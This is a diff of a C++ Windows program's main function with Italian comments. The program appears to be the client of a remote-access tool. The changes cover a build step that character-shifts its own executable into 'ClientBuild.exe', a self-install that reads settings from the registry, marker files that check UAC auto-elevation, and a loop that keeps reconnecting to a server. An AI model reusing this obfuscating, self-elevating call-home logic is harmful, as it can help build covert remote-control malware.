@@ -34,19 +34,26 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     else
         freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
 
+    // Per generare la build del Client da distribuire
     if (du.CheckFile(du.GetModuleFilePath() + "SetBuild"))
     {
         en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
         return 0;
     }
 
-    if (!du.CheckFile(du.GetModuleFilePath() + "LocTest"))
+    // Per test locali senza installazione
+    if (du.CheckFile(du.GetModuleFilePath() + "LocTest"))
+    {
+        sett.Host = "127.0.0.1";
+        sett.Porta = 6969;
+    }
+    else
     {
         if (!IsInstalled())
         {
             short rtn = InstallClient();
 
-            if(DEBUG)
+            if (DEBUG)
                 msgb.Ok("Codice installazione: " + to_string(rtn));
 
             return 0;
@@ -54,14 +61,33 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         sett.GetSettingsFromReg();
     }
-    else
-    {
-        sett.Host = "127.0.0.1";
-        sett.Porta = 6969;
-    }
 	
-	if (su.CheckUAC())
-		du.WriteFile(du.GetModuleFilePath() + "Elevated");
+    // Verifica che l'auto elevazione sia andata a buon fine
+    if (du.CheckFile(du.GetModuleFilePath() + "Aele"))
+    {
+        if (su.CheckUAC())
+        {
+            du.WriteFile(du.GetModuleFilePath() + "AeleOK");
+        }
+        else
+        {
+            if (du.CheckFile(du.GetModuleFilePath() + "AeleOK"))
+            {
+                du.DelFile(du.GetModuleFilePath() + "Aele");
+                du.DelFile(du.GetModuleFilePath() + "AeleOK");
+                du.DelFile(du.GetModuleFilePath() + "AeleSA");
+                return 0;
+            }
+            
+            du.DelFile(du.GetModuleFilePath() + "Aele");
+
+            if (du.CheckFile(du.GetModuleFilePath() + "AeleSA"))
+            {
+                du.DelFile(du.GetModuleFilePath() + "AeleSA");
+                return 0;
+            }
+        }
+    }
 
     su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%
 
@@ -77,7 +103,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     for (bool i = true; i;)
     {
-        while (!Client.Connect()) {}
+        while (!Client.Connect()) { Sleep(100); }
         
         if (DEBUG)
             cout << "Ricevuta connessione" << endl;
